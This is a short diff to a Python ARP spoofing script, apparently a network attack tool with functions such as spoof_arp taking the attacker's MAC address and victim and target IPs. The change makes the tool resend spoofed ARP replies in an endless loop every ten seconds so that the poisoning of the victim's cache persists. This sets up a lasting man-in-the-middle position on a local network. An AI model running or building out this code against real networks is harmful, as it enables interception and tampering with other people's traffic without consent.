@@ -38,6 +38,7 @@ def spoof_arp(own_mac, victim_ip, target_ip):
 
 
 def main():
+
     try:
         attacker_mac = get_own_mac_address()
     except Exception as e:
@@ -45,7 +46,9 @@ def main():
         sys.exit(1)
     # fill_arp_cache(attacker_mac, vIP, tIP)  # <= 1 execution
     # time.sleep(2)
-    spoof_arp(attacker_mac, vIP, tIP)
+    while(True):
+        spoof_arp(attacker_mac, vIP, tIP)
+        time.sleep(10)
 
 
 if __name__ == "__main__":
